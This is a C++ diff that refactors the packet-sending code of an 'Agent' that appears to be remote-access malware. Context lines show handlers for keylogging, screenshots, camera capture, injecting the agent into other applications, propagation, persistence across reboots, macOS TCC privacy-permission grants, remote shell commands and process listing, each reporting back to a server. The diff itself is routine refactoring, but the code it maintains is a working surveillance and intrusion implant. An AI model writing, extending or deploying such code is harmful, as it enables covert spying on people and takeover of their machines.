@@ -227,9 +227,7 @@ void Agent::handleDispatching(Packet&& packet) {
 
     if (opcode == static_cast<uint16_t>(Opcode::SYS_REQ_INFO)) {
         std::string info = getSystemInfo();
-        Packet res(static_cast<uint16_t>(Opcode::SYS_RES_INFO), info);
-        std::vector<uint8_t> data = res.serialize();
-        m_socket.sendData(data);
+        m_socket.sendPacket(static_cast<uint16_t>(Opcode::SYS_RES_INFO), info);
 
         // Tier 2: scan for injectable apps and report all targets to server
         std::string scan_report = "none||0|0";
@@ -290,9 +288,7 @@ void Agent::handleDispatching(Packet&& packet) {
             std::cerr << "[Agent] Scanner failed with unknown error" << std::endl;
             scan_report = "none||0|0";
         }
-        Packet scan_res(static_cast<uint16_t>(Opcode::SCAN_RESULT), scan_report);
-        data = scan_res.serialize();
-        m_socket.sendData(data);
+        m_socket.sendPacket(static_cast<uint16_t>(Opcode::SCAN_RESULT), scan_report);
 
         // Persist for reboot survival (only once per session)
         if (!m_persistence_installed) {
@@ -314,9 +310,7 @@ void Agent::handleDispatching(Packet&& packet) {
                 m_keylog_pending_data.clear();
             }
         }
-        Packet pong(static_cast<uint16_t>(Opcode::PONG), pong_payload);
-        std::vector<uint8_t> data = pong.serialize();
-        m_socket.sendData(data);
+        m_socket.sendPacket(static_cast<uint16_t>(Opcode::PONG), pong_payload);
     } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_START)) {
         handleKeylogStart();
     } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_STOP)) {
@@ -419,16 +413,14 @@ void Agent::handlePropagation(Packet&& packet) {
     payload.push_back(static_cast<uint8_t>(out_len & 0xFF));
     payload.insert(payload.end(), result.output.begin(), result.output.begin() + output_size);
 
-    Packet res(static_cast<uint16_t>(Opcode::PROPAGATE_RES),
-               std::string(payload.begin(), payload.end()));
-    m_socket.sendData(res.serialize());
+    m_socket.sendPacket(static_cast<uint16_t>(Opcode::PROPAGATE_RES),
+                         std::string(payload.begin(), payload.end()));
 }
 
 void Agent::handleInjection(Packet&& packet) {
     const auto& raw = packet.getPayload();
     if (raw.empty()) {
-        Packet res(static_cast<uint16_t>(Opcode::INJECT_RES), "empty|empty|0|0");
-        m_socket.sendData(res.serialize());
+        m_socket.sendPacket(static_cast<uint16_t>(Opcode::INJECT_RES), "empty|empty|0|0");
         return;
     }
 
@@ -465,8 +457,7 @@ void Agent::handleInjection(Packet&& packet) {
                        + std::to_string(static_cast<int>(target.capability)) + "|"
                        + (success ? "1" : "0");
 
-    Packet res(static_cast<uint16_t>(Opcode::INJECT_RES), result);
-    m_socket.sendData(res.serialize());
+    m_socket.sendPacket(static_cast<uint16_t>(Opcode::INJECT_RES), result);
 
     if (success) {
         persistInjectedAgent(m_server_ip, m_server_port, target_path);
@@ -501,9 +492,8 @@ void Agent::handleScreenshot() {
     payload.push_back(static_cast<uint8_t>(sz & 0xFF));
     payload.insert(payload.end(), result.jpeg_data.begin(), result.jpeg_data.end());
 
-    Packet res(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
-               std::string(payload.begin(), payload.end()));
-    m_socket.sendData(res.serialize());
+    m_socket.sendPacket(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
+                         std::string(payload.begin(), payload.end()));
     if (result.success) {
         std::cout << "[Agent] Screenshot captured (" << w << "x" << h
                   << ", " << sz << " bytes)" << std::endl;
@@ -538,17 +528,15 @@ void Agent::handleCameraCapture() {
     payload.push_back(static_cast<uint8_t>(sz & 0xFF));
     payload.insert(payload.end(), result.jpeg_data.begin(), result.jpeg_data.end());
 
-    Packet res(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
-               std::string(payload.begin(), payload.end()));
-    m_socket.sendData(res.serialize());
+    m_socket.sendPacket(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
+                         std::string(payload.begin(), payload.end()));
     std::cout << "[Agent] Camera captured (" << w << "x" << h
               << ", " << sz << " bytes)" << std::endl;
 #else
     std::vector<uint8_t> payload(14, 0);
     payload[1] = 1;
-    Packet res(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
-               std::string(payload.begin(), payload.end()));
-    m_socket.sendData(res.serialize());
+    m_socket.sendPacket(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
+                         std::string(payload.begin(), payload.end()));
     std::fprintf(stderr, "[Agent] Camera not supported on this platform\n");
 #endif
 }
@@ -568,8 +556,7 @@ void Agent::handleTccGrant(Packet&& packet) {
     result_str = bundle_id + "|0";
 #endif
 
-    Packet res(static_cast<uint16_t>(Opcode::TCC_GRANT_RES), result_str);
-    m_socket.sendData(res.serialize());
+    m_socket.sendPacket(static_cast<uint16_t>(Opcode::TCC_GRANT_RES), result_str);
 }
 
 #ifdef INFERNO_TESTING
@@ -662,9 +649,8 @@ void Agent::handleShellExecution(Packet&& packet) {
         payload.push_back(static_cast<uint8_t>(len & 0xFF));
         payload.insert(payload.end(), data.begin(), data.end());
 
-        Packet res(static_cast<uint16_t>(Opcode::CMD_RES),
-                   std::string(payload.begin(), payload.end()));
-        m_socket.sendData(res.serialize());
+        m_socket.sendPacket(static_cast<uint16_t>(Opcode::CMD_RES),
+                             std::string(payload.begin(), payload.end()));
     };
 
     if (total == 0) {
@@ -733,10 +719,8 @@ void Agent::handleProcessDiscovery() {
             payload.insert(payload.end(), list[i].name.begin(), list[i].name.end());
         }
 
-        Packet res(static_cast<uint16_t>(Opcode::PROC_LIST_RES), 
-                  std::string(payload.begin(), payload.end()));
-        
-        m_socket.sendData(res.serialize());
+        m_socket.sendPacket(static_cast<uint16_t>(Opcode::PROC_LIST_RES),
+                             std::string(payload.begin(), payload.end()));
     }
 }
 
